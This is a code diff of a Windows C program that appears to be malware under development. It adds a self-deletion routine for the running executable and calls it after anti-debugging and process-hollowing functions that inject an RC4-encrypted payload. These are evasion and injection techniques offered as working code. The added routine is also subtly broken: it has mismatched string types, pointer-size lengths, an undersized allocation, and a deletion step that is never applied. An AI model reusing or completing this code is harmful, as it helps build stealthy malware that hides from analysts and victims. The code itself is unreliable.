@@ -258,6 +258,66 @@ void detectDebug() {
     return FALSE;
 }
 
+
+void selfDelete() {
+
+    HANDLE hFile = INVALID_HANDLE_VALUE; //We need to retrieve a file handle to THIS running process.
+    const wchar_t* datastream = "noah";
+
+    size_t sRenameSize = sizeof(FILE_RENAME_INFO) + sizeof(datastream); //
+    PFILE_RENAME_INFO pFRI = NULL; //this structure contains the target name that a source file should be renamed to.
+                                   //it also has fields for file lenghts
+                                   //filename can be a filepath or the new name of a NTFS file stream starting with :
+    
+    FILE_DISPOSITION_INFO FDI = { 0 }; //this structure contains the field tha if a file should be deleted or not when set to true
+    
+
+    pFRI = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(datastream) );
+    
+    //zero out structures
+    ZeroMemory(&FDI, sizeof(FDI));
+
+    //now we need to mark that the file should be deleted in file_disposition_struct
+
+    FDI.DeleteFileW = TRUE;
+    printf("Marked for deletion in strcut");
+
+    //now populate the file_rename_info struct
+
+    pFRI->FileNameLength = sizeof(datastream); // set new file name length to length of new datastream name
+
+    RtlCopyMemory(pFRI->FileName, datastream, sizeof(datastream)); //copy new datastream name into struct
+
+    printf("Set new stream name to %S", pFRI->FileName);
+    printf("Set new stream name length to %d", pFRI->FileNameLength);
+
+    //now get current file name w GetModuleHandle
+
+    //If first parameter is null, use current process and store in second parameter.
+    WCHAR localFilePath[MAX_PATH * 2] = { 0 };
+    GetModuleFileNameW(NULL, localFilePath, MAX_PATH * 2);
+
+
+    //now we get handle to this file, then use SetFileINformationBYHandle func
+    //This lets use pass a FileINformationClass structure, isnide of that is an attribute for a file disposition info struct!
+
+
+    //minimum amount of access rights is DELETE|SYNCHRONIZE.
+    HANDLE localHandle = CreateFileW(localFilePath, (DELETE | SYNCHRONIZE), FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
+
+    //now set the strcut info
+    getchar();
+    SetFileInformationByHandle(localHandle, FileRenameInfo, pFRI, sRenameSize);
+    //to make changes we MUST MUST MUST CLOSE HANDLE, CHANGES ARE DONE ON HANDLE CLOSE.
+    getchar();
+    CloseHandle(localHandle);
+
+    //file should be deleted by the OS at this point....
+
+    HeapFree(GetProcessHeap(), 0, pFRI);
+
+    //now take this stream and 
+}
 int main() {
 
 
@@ -284,5 +344,6 @@ int main() {
     //}
     detectDebug();
     hollowProcess(Pi, sizeof(Rc4CipherText));
+    selfDelete();
     return 0;
 }
